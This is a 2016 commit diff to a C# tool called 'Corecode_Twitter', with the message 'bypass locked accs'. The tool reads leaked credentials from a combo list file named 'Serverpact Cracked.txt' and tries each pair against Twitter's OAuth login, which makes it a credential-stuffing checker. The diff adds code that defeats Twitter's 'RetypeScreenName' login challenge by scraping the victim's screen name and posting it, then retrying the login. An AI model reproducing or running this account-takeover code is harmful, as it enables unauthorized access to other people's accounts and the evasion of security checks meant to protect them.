1d499d53ff69c123618b2800fafae3602392ee5e
matthw          ྈ̶̶̷̸྄ིེེེེེེེིྀ༵༷͇͇͈̳̳̳̤̥̥༵༵༷༷྇྆ͯͯ͋ྂྃ͜͜͜͝͡ྈ̶̶̷̸ིེེེེེེེིྀ༵༷͇͇͈̳̳̳̤̥̥༵༵༷༷྇྆ͯͯ͋ྂ͜͜͜͝͡ྈ̶̶̷̸྄ིེེེེེེེིྀ༵༷͇͇͈̳̳̳̤̥̥༵༵༷༷྇྆ͯͯ͋ྂྃ͜͜͜͝͡ྈ̶̶̷̸ིེེེེེེེིྀ༵༷͇͇͈̳̳̳̤̥̥༵༵༷༷྇྆ͯͯ͋ྂ͜͜͜͝͡ྈ̶̶̷̸ིེེ༵༷͇͇͈̳̳̳྇྆ͯͯ͋͜͜͜͝͡ྈ̶̶̷̸ིེེེེེེེིྀ༵༷͇͇͈̳̳̳̤̥̥༵༵༷༷྇྆ͯͯ͋͜͜͜͝͡ <properties@users.noreply.github.com>
2016-06-28 16:51:39 +0200

    Update program.cs
    bypass locked accs

--- program.cs
+++ program.cs
@@ -12,8 +12,9 @@ namespace Corecode_Twitter
         static void Main(string[] args)
         {
 
-            Console.Write("Combo List Path: ");
-            string combolist = Console.ReadLine();
+            //Console.Write("Combo List Path: ");
+            string combolist = @"C:\Users\Matthew\Desktop\Serverpact Cracked.txt"/*Console.ReadLine()*/;
+
 
             StreamReader ImportFile = new StreamReader(combolist);
             string line;
@@ -21,14 +22,14 @@ namespace Corecode_Twitter
             while ((line = ImportFile.ReadLine()) != null)
             {
                 total_done++;
-                string[] Account = line.Split(':');
-                string username_or_email = Account.Length >= 1 ? Account[0] : null;
-                string password = Account.Length >= 2 ? Account[1] : null;//
+                string[] Account = line.Split('|');
+                string username_or_email = Account.Length >= 2 ? Account[1] : null;
+                string password = /*Account.Length >= 5 ?*/ Account[4] /*: null*/;
 
-                Console.WriteLine(addTwitter(username_or_email, password));
+                Console.WriteLine(addTwitter(username_or_email, password.ToLower()));
             }
             Console.WriteLine(String.Format("[LAST=DONE] Done: {0}, added {1}", total_done.ToString(), valid_done.ToString()));
-            Console.WriteLine();
+            Console.ReadLine();
         }
 
         private static string addTwitter(string username_or_email, string password)
@@ -50,7 +51,7 @@ namespace Corecode_Twitter
             }
             Twitter.CookieContainer = Cookies;
 
-
+            loginAgain:
             RestRequest oauth_authorize = new RestRequest("/oauth/authorize", Method.POST);
             oauth_authorize.AddParameter("authenticity_token", authenticity_token);
             oauth_authorize.AddParameter("redirect_after_login", "https://api.twitter.com/oauth/authorize?oauth_token=" + oauth_token);
@@ -62,42 +63,55 @@ namespace Corecode_Twitter
             string account_information = String.Format("[{2}={3}] {0}: ", username_or_email, new string('*', password.Length), authenticity_token, oauth_token);
 
             if (verifier_oauth.Content.Contains("https://support.twitter.com/articles/63510"))
+            {
                 return account_information + "Your IP is currently locked for 1 hour. Please change your IP and press a key to proceed";
+                //Console.ReadLine();
+            }
 
             else if (verifier_oauth.Content.Contains("login-challenge-form"))
             {
-                /*//Console.WriteLine(verifier_oauth.Content);
-                string user_id = getBetween(verifier_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
-                string second_authenticity_token = getBetween(verifier_oauth.Content, "name=\"authenticity_token\" value=\"", "\"/>");
-                string challenge_id = getBetween(verifier_oauth.Content, "name=\"challenge_id\" value=\"", "\"/>");
+                string challenge_type = getBetween(verifier_oauth.Content, "name=\"challenge_type\" value=\"", "\"/>");
 
-                string hack_user_id = coreSX.DownloadString("https://twitter.com/intent/user?user_id=" + user_id);
-                string screen_name = getBetween(hack_user_id, "name=\"screen_name\" value=\"", "\">");
-                //Console.WriteLine(user_id + second_authenticity_token + challenge_id + screen_name);
+                if (challenge_type == "RetypeScreenName")
+                {
 
-                RestRequest login_challenge = new RestRequest("/account/login_challenge", Method.POST);
-                login_challenge.AddParameter("authenticity_token", second_authenticity_token);
-                login_challenge.AddParameter("challenge_id", challenge_id);
-                login_challenge.AddParameter("user_id", user_id);
-                login_challenge.AddParameter("challenge_type", "RetypeScreenName");
-                login_challenge.AddParameter("platform", "web");
-                login_challenge.AddParameter("redirect_after_login", "/");
-                login_challenge.AddParameter("remember_me", "true");
-                login_challenge.AddParameter("challenge_response", screen_name);
-                var unlocked_account = Twitter.Post(login_challenge);
+                    string user_id = getBetween(verifier_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
+                    string second_authenticity_token = getBetween(verifier_oauth.Content, "name=\"authenticity_token\" value=\"", "\"/>");
+                    string challenge_id = getBetween(verifier_oauth.Content, "name=\"challenge_id\" value=\"", "\"/>");
+                    string redirect_after_login = getBetween(verifier_oauth.Content, "name=\"redirect_after_login\" value=\"", "\"/>");
 
-                Console.WriteLine(unlocked_account.Content);
+                    string hack_user_id = coreSX.DownloadString("https://twitter.com/intent/user?user_id=" + user_id);
+                    string screen_name = getBetween(hack_user_id, "<span class='tweet-full-name'>@", "</span>");
 
-                RestRequest oauth2_authorize = new RestRequest("/oauth/authorize", Method.POST);
-                oauth2_authorize.AddParameter("authenticity_token", authenticity_token);
-                oauth2_authorize.AddParameter("redirect_after_login", "https://api.twitter.com/oauth/authorize?oauth_token=" + oauth_token);
-                oauth2_authorize.AddParameter("oauth_token", oauth_token);
-                oauth2_authorize.AddParameter("session[username_or_email]", username_or_email);
-                oauth2_authorize.AddParameter("session[password]", password);
-                var verifie2r_oauth = Twitter.Post(oauth2_authorize);
-                Console.WriteLine(verifie2r_oauth.Content);
-                Console.ReadLine();*/
-                return account_information +  "login-challenge-form";
+                    RestRequest RetypeScreenName_challenge = new RestRequest("/account/login_challenge", Method.POST);
+                    RetypeScreenName_challenge.AddParameter("authenticity_token", second_authenticity_token);
+                    RetypeScreenName_challenge.AddParameter("challenge_id", challenge_id);
+                    RetypeScreenName_challenge.AddParameter("user_id", user_id);
+                    RetypeScreenName_challenge.AddParameter("challenge_type", "RetypeScreenName");
+                    RetypeScreenName_challenge.AddParameter("platform", "web");
+                    RetypeScreenName_challenge.AddParameter("redirect_after_login", redirect_after_login);
+                    RetypeScreenName_challenge.AddParameter("remember_me", "true");
+                    RetypeScreenName_challenge.AddParameter("challenge_response", screen_name);
+                    var unlocked_account = Twitter.Post(RetypeScreenName_challenge);
+
+                    Console.WriteLine(account_information + "login-challenge-form bypassed");
+                    goto loginAgain;
+
+                }
+                else if(challenge_type == "TemporaryPassword")
+                {
+                    string user_id = getBetween(verifier_oauth.Content, "name=\"user_id\" value=\"", "\"/>");
+                    string hack_user_id = coreSX.DownloadString("https://twitter.com/intent/user?user_id=" + user_id);
+                    string screen_name = getBetween(hack_user_id, "<span class='tweet-full-name'>@", "</span>");
+
+
+                    return "";
+
+                }
+                else
+                {
+                    return account_information + String.Format("login-challenge-form ({0})", challenge_type);
+                }
 
             }
 
